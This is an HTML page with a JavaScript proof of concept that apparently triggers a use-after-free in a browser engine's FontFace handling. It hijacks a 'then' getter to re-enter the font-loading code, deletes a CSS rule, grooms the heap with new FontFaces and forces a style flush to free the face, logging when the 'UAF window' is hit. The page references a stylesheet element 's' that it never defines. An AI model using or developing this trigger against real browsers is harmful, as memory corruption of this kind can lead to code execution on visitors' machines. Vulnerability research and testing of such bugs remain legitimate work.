<pre id="log"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

window.onload = () => {
    L('[+] Setup starting...');
    
    // Create the trigger face via JS API with a local source
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    
    // Critical: forces the native loaded promise to be created early
    void A.loaded; 

    let fired = false;
    const origThen = Object.getOwnPropertyDescriptor(FontFace.prototype, 'then');

    // Install same-stack thenable getter
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                L('[+] then getter fired! Synchronous re-entry achieved.');

                // Mutate CSSOM: delete the CSS-connected rule for family 'x'
                try {
                    document.getElementById('s').sheet.deleteRule(0);
                    L('[+] deleteRule(0) done');
                } catch(e) {
                    L('[!] deleteRule: ' + e);
                }

                // Create new FontFaces to churn the heap and groom the IsoHeap
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });

                // Force style/layout flush
                // Document::updateStyleIfNeeded -> Style::Scope::updateActiveStyleSheets
                // -> CSSFontSelector::buildCompleted -> CSSFontFaceSet::remove(face)
                document.body.offsetTop; 
                L('[+] offsetTop forced style. face may be freed.');

                // Restore then so promise machinery doesn't break
                if (origThen) {
                    Object.defineProperty(FontFace.prototype, 'then', origThen);
                }
            }
            return origThen ? origThen.value : undefined;
        }
    });

    L('[+] Calling document.fonts.load("1em x", "AB")');
    document.fonts.load('1em x', 'AB').then(faces => {
        L('[+] load() resolved, faces: ' + faces.length);
        if (fired) {
            L('[+] UAF window exercised. If vulnerable, memory is corrupted.');
            L('[+] If ASAN is active, check logs for heap-use-after-free.');
        } else {
            L('[!] Getter did not fire. Synchronous resolution failed.');
        }
    }).catch(e => {
        L('[!] load() rejected: ' + e);
    });
};
</script>
